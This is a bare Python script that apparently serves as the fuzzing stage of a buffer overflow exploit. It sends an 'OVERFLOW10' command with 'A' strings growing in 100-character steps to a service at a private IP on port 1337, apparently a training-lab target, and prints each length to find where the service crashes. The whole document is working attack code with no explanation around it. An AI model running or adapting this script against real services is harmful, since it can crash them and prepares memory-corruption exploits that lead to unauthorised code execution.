import sys,socket

ip = "10.10.148.12"
port = 1337

test = []
counter = 100

while len(test) < 50:
    test.append("A" * counter)
    counter += 100

for string in test:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        
        s.recv(1024)
        print(len(string))
        s.send("OVERFLOW10 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("connection error")
        sys.exit(0)

